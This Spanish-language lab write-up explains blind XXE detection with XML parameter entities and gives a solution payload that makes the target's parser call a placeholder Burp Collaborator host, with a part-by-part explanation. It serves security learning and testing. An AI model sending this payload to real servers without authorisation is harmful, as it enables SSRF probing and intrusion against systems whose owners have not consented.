En esta clase continuamos con la explotación de vulnerabilidades XXE ciegas, utilizando una variante más sofisticada. En este caso, la aplicación bloquea las entidades externas tradicionales, lo que nos obliga a recurrir al uso de parameter entities, una técnica menos común pero igualmente poderosa.

El objetivo es forzar al analizador XML a realizar una solicitud externa, y para ello empleamos Burp Collaborator como canal para observar si el servidor realiza conexiones salientes. Si vemos actividad en Collaborator después de enviar nuestra carga, confirmamos la vulnerabilidad.

Este enfoque es especialmente útil en entornos donde se han implementado filtros para mitigar las XXE básicas, pero aún persisten configuraciones inseguras que pueden ser explotadas con técnicas más avanzadas.

Solucion
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
### 🧩 Explicación de cada parte:

1. **`<!DOCTYPE stockCheck [...]>`**
    
    - Se define un `DOCTYPE` llamado `stockCheck`. El nombre no importa mucho, solo es requerido para declarar entidades DTD (Document Type Definition).
        
2. **`<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">`**
    
    - Se declara una **entidad externa de parámetro** llamada `%xxe`.
        
    - El valor de esta entidad es lo que devuelve la URL: `http://BURP-COLLABORATOR-SUBDOMAIN`
        
    - Esta URL pertenece a **Burp Collaborator**, una herramienta que permite detectar interacciones salientes desde servidores vulnerables.
        
3. **`%xxe;`**
    
    - Aquí se **invoca la entidad de parámetro** `%xxe`.
        
    - Cuando el parser XML trata de expandirla, hace una **solicitud HTTP a la URL especificada**.
        
    - Si el servidor realiza esa petición, el atacante (usando Burp Collaborator) lo detecta, confirmando la vulnerabilidad.
Este payload:

- Usa **entidades de parámetro** para forzar al servidor a conectarse a un servidor externo (como Burp Collaborator).
    
- Sirve para detectar si el servidor es **vulnerable a XXE + SSRF**.
    
- Es una técnica usada comúnmente en **pruebas de seguridad** (pentesting).

![[Pasted image 20250730195232.png]]
